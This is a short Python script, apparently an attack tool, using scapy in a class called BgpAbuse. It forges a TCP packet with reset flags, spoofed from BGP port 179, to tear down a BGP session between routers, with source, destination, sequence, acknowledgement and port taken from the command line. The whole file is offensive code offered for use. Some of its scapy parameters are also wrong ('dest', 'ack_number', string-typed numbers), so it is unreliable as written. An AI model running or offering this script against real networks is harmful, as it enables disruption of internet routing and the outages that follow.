from scapy.all import *
import argparse


class BgpAbuse:
    def __init__(self, source, destination, seq_number, ack_number, port,
                 args):
        self.source = source
        self.destination = destination
        self.port = port
        self.seq_number = seq_number
        self.ack_number = ack_number

    def attack(self):
        bgp_reset = IP(src=self.source, dest=self.destination, ttl=1) / TCP(
            dport=self.port,
            sport=179,
            flags="RA",
            seq=self.seq_number,
            ack_number=self.ack_number)
        send(bgp_reset)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--source", help="Source Address", required=True)
    parser.add_argument("-d",
                        "--destination",
                        help="Destination Address",
                        required=True)
    parser.add_argument("-sN",
                        "--seq_number",
                        help="Seq Number",
                        required=True)
    parser.add_argument("-aC",
                        "--ack_number",
                        help="AckNumber Address",
                        required=True)
    parser.add_argument("-p",
                        "--port",
                        help="Destination Port Number",
                        required=True)

    args = parser.parse_args()

    source = args.source
    destination = args.destination
    seq_number = args.seq_number
    ack_number = args.ack_number
    port = args.port

    app = BgpAbuse(source, destination, seq_number, ack_number, port, args)
    app.attack()
